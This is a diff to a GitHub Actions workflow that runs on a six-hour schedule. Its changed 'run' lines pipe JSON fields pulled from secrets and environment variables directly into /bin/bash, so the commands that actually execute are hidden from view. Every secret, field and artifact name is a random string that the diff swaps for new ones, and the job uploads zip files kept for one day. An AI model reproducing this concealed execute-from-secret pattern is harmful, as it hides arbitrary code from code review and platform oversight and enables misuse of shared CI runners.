@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '41 0,6,12,18 * * *'
+    - cron: '54 0,6,12,18 * * *'
 jobs:
   launch:
     runs-on: ubuntu-latest
@@ -15,17 +15,17 @@ jobs:
           fetch-depth: 1
       - name: Do work
         env:
-          hwqdn71: ${{ secrets.hwqdn71 }}
+          xpqxz9193: ${{ secrets.xpqxz9193 }}
         run: |
-          printf '%s' "$hwqdn71" | jq -r .zyvvx1 | /bin/bash
-          printf '%s' "$lz5796" | jq -r .bafkt62 | /bin/bash
-          printf '%s' "$h07174" | jq -r .tq2336 | /bin/bash
-          echo $rwhoo0 | jq -r .p022 | /bin/bash
-          printf '%s' "$nmipj710" | jq -r .wmzx8002 | /bin/bash
+          printf '%s' "$xpqxz9193" | jq -r .g43599 | /bin/bash
+          echo $u7 | jq -r .udh23 | /bin/bash
+          printf '%s' "$qxcne1121" | jq -r .fq3 | /bin/bash
+          echo $a0 | jq -r .k70618 | /bin/bash
+          echo $bhvp14 | jq -r .rmdh73 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
         with:
-          name: cjUkOxoS
+          name: 7lhqKfQ7
           path: "*.zip"
           retention-days: 1
